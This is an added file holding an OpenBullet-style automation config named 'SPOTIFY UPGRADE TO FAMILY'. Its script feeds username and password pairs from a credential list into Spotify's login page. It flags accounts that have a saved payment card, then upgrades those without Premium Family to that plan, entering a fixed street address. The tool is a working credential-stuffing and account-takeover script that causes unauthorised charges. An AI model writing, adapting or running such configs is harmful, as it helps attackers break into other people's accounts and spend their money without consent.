@@ -1,0 +1,140 @@
+[SETTINGS]
+{
+  "Name": "SPOTIFY UPGRADE TO FAMILY",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-14T22:23:02.9692232-04:00",
+  "AdditionalInfo": "",
+  "Author": "The Architect",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+NAVIGATE "https://accounts.spotify.com/en/login/?_locale=en-US&continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+
+ELEMENTACTION XPath "//*[@id=\"login-username\"]" 
+  SendKeys "<USER>" 
+
+ELEMENTACTION XPath "//*[@id=\"login-password\"]" 
+  SendKeys "<PASS>" 
+
+ELEMENTACTION XPath "//*[@id=\"login-button\"]" 
+  Click 
+
+FUNCTION Delay "1000" 
+
+BROWSERACTION DOMtoSOURCE 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "PaymentMethod__nameAndExpiration" 
+  KEYCHAIN Success OR 
+    KEY "PaymentMethod__nameAndExpiration" 
+
+NAVIGATE "https://www.spotify.com/us/account/subscription/change/" 
+
+BROWSERACTION DOMtoSOURCE 
+
+PARSE "<SOURCE>" LR "Current plan" "Card__body" -> VAR "CURRENT" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<CURRENT>" Contains "Spotify Premium Family" 
+  KEYCHAIN Success OR 
+    KEY "<CURRENT>" DoesNotContain "Spotify Premium Family" 
+
+ELEMENTACTION XPath "//*[@id=\"account-csr-container\"]/div/div/div[2]/div[2]/div/div[2]/div/a" 
+  Click 
+
+ELEMENTACTION XPath "//*[@id=\"account-csr-container\"]/div/form/div[1]/div/div[3]/div/p[1]/label/input" 
+  Click 
+
+ELEMENTACTION XPath "//*[@id=\"account-csr-container\"]/div/form/div[2]/div/div[1]/button" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Available plans" 
+  KEYCHAIN Success OR 
+    KEY "Welcome to Spotify Premium Family" 
+
+FUNCTION Delay "2000" 
+
+NAVIGATE "https://www.spotify.com/us/family/welcome/" 
+
+ELEMENTACTION XPath "//*[@id=\"welcome-page\"]/div/div/a" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Find address" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "LoadingIndicatorCircle" 
+
+FUNCTION Constant "9620 Sunset Ridge Rd S Minocqua, Wisconsin" -> CAP "ADDRESS" 
+
+ELEMENTACTION XPath "//*[@id=\"address\"]" 
+  SendKeys "<ADDRESS>" 
+
+ELEMENTACTION XPath "//*[@id=\"duo-home-root\"]/form/main/div/div/button" 
+  Click 
+
+ELEMENTACTION XPath "//*[@id=\"confirm-address-dialog\"]/footer/button[2]" 
+  Click 
+
+BROWSERACTION DOMtoSOURCE 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Success" 
+
